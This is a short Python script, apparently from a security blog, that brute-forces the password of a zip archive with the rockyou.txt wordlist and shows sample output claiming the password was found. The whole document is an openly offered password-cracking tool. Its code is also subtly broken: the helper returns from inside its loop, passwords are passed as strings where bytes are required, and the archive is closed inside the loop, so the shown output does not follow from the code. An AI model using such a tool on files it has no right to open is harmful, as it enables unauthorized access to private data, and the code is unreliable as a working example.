# Python 3 dictionary-based zip password cracker
# By security.somanos based on pure.python code

filename = "confidential.zip"  # raw_input("Enter zip to crack: ")
dictionaryname = "rockyou.txt" # raw_input("Enter dictionary file: ")

dictionary = open(dictionaryname, "r")

from zipfile import ZipFile

# This function gets one member of a zip file
def getFirstMemberName(zip):
  membername = zip.namelist()[0] 
  i = 1                            # It must ensure it is extracting
  while(membername[-1] == "/"):    # a single file and not a directory
    i += 1                         # for performance reasons. I'm avoding
    membername = zip.namelist()[i] # the use of extractall method
    return membername



with ZipFile(filename, "r") as zip:
        
 # getFirstMemberName is a custom function that
 # returns the name of a file inside the zip file
 # See next picture for source
 membername = getFirstMemberName(zip)
     
 print("Attempting dictionary-based attack")
 print("Opening " + membername)
       
 for password in dictionary.readlines():
   try:
     # readlines() returns the the newline character
     # It must be stripped
     password = password.strip("\n") 
     #print("Trying: " + password)
     zip.open(membername, pwd=password)
     # If the password is incorrect it 
     # throws an exception
     print("Password found: " + password)
   except:
     pass
   zip.close()



#************************** OUTPUT **************************************

#Attempting dictionary-based attack
#Opening Myfolder/myfile.txt
#Password found: letmein
